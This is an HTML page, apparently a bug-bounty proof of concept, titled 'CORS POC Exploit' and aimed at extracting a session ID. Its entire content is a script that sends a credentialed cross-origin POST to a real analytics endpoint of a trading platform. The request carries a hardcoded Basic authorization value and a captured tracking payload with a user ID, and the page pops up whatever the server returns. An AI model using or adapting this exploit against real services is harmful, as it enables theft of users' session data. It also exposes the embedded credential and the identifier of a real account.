<!DOCTYPE html>
<html>
<body>
<center>
<h2>CORS POC Exploit</h2>
<h3>Extract SID</h3>
 
<div id="demo">
<button type="button" onclick="cors()">Exploit</button>
</div>
 
<script>
function cors() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      document.getElementById("demo").innerHTML = alert(this.responseText);
    }
  };
  xhttp.open("POST", "https://deriv-dataplane.rudderstack.com/v1/page", true);
  xhttp.setRequestHeader("Content-Type", "application/json");
  xhttp.setRequestHeader("Authorization", "Basic MW9WNWFndmxjbkNaNklIOTR3Q0tNMW9SOFBkOg==");
  xhttp.withCredentials = true;

  var data = JSON.stringify({
    "channel": "web",
    "context": {
      "app": {"name": "RudderLabs JavaScript SDK","namespace": "com.rudderlabs.javascript","version": "2.44.0"},
      "traits": {"language": "en"},
      "library": {"name": "RudderLabs JavaScript SDK","version": "2.44.0"},
      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36",
      "os": {"name": "","version": ""},
      "locale": "en-US",
      "screen": {"density": 1.25,"width": 1536,"height": 864,"innerWidth": 767,"innerHeight": 730},
      "timezone": "GMT+0700",
      "sessionId": 1720711309335,
      "campaign": {},
      "page": {
        "path": "/",
        "referrer": "https://oauth.deriv.com/",
        "referring_domain": "oauth.deriv.com",
        "search": "",
        "title": "Trader | Deriv",
        "url": "https://app.deriv.com",
        "tab_url": "https://app.deriv.com/dtrader",
        "initial_referrer": "$direct",
        "initial_referring_domain": ""
      }
    },
    "type": "page",
    "messageId": "8ba0d860-8c2c-4615-b359-276908f4a2e4",
    "originalTimestamp": "2024-07-11T15:22:48.725Z",
    "anonymousId": "b2b4eb29-81d6-48b7-8025-b0a978c725ee",
    "userId": "15054173",
    "properties": {
      "user_id": "15054173",
      "name": "https://app.deriv.com/dtrader",
      "category": "Deriv App",
      "path": "/",
      "referrer": "https://oauth.deriv.com/",
      "referring_domain": "oauth.deriv.com",
      "search": "",
      "title": "Trader | Deriv",
      "url": "https://app.deriv.com",
      "tab_url": "https://app.deriv.com/dtrader",
      "initial_referrer": "$direct",
      "initial_referring_domain": ""
    },
    "name": "https://app.deriv.com/dtrader",
    "category": "Deriv App",
    "integrations": {"All": true},
    "sentAt": "2024-07-11T15:24:02.739Z"
  });

  xhttp.send(data);
}
</script>
 
</body>
</html>
